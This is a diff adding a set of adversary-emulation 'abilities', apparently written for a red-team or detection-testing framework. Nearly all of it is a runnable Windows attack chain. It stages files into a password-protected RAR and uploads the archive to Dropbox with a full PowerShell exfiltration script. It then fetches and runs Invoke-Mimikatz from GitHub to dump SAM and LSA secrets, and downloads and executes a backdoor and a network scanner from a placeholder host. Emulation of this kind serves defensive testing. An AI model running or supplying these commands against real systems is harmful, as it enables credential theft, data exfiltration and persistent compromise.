@@ -1,0 +1,49 @@
+Ability Winrar Download:
+if not exist "%programfiles%/WinRAR/Rar.exe"  ( call ) ELSE ( echo Downloading Winrar installer && bitsadmin /transfer myDownloadJob /download /priority normal "https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe" %TEMP%\winrar.exe && %TEMP%\winrar.exe /S )
+ 
+Ability RarGen:
+mkdir %TEMP%\victim-files && cd %TEMP%\\victim-files && echo "This file will be encrypted" > .\encrypted_file.txt && "%programfiles%/WinRAR/Rar.exe" a -hp"blue" secret_data.rar
+ 
+ 
+Ability exfil Dropbox:
+$SourceFile = (Get-Item $env:temp\secret_data.rar);
+$RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-rar-$($SourceFile.name)";
+$TargetFilePath = "/Exfiltration/$RemoteName";
+$ApiKey = "<APIKEY>";
+ 
+$url = "https://content.dropboxapi.com/2/files/upload";
+ 
+$file = [IO.File]::ReadAllBytes($SourceFile);
+[net.httpWebRequest] $req = [net.webRequest]::create($url);
+ 
+$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }';
+$authorization = "Bearer " + $ApiKey;
+ 
+$req.method = "POST";
+$req.Headers.Add("Authorization", $authorization);
+$req.Headers.Add("Dropbox-API-Arg", $arg);
+$req.ContentType = 'application/octet-stream';
+$req.ContentLength = $file.length;
+$req.TimeOut = 50000;
+$req.KeepAlive = $true;
+$req.Headers.Add("Keep-Alive: 300");
+$reqst = $req.getRequestStream();
+$reqst.write($file, 0, $file.length);
+$reqst.flush();
+$reqst.close();
+ 
+[net.httpWebResponse] $res = $req.getResponse();
+$resst = $res.getResponseStream();
+$sr = new-object IO.StreamReader($resst);
+$result = $sr.ReadToEnd();
+$result;
+$res.close();
+ 
+Ability mimikatz:
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam" "lsadump::secrets"'
+ 
+Ability Toneshell:
+Invoke-WebRequest -Uri 'http://<IP>:<port>/ToneShellBackdoor.exe' -OutFile "$env:temp\ToneShellBackdoor.exe"; Start-Process -FilePath "$env:temp\ToneShellBackdoor.exe"
+ 
+Ability NBT:
+Invoke-WebRequest -Uri 'http://<IP>:<port>/SharpNBTScan.exe' -OutFile 'C:\Users\softs\tmp\SharpNBTScan.exe'; Start-Process -FilePath 'C:\Users\softs\tmp\SharpNBTScan.exe' -ArgumentList '<IP>/<netmask>' 
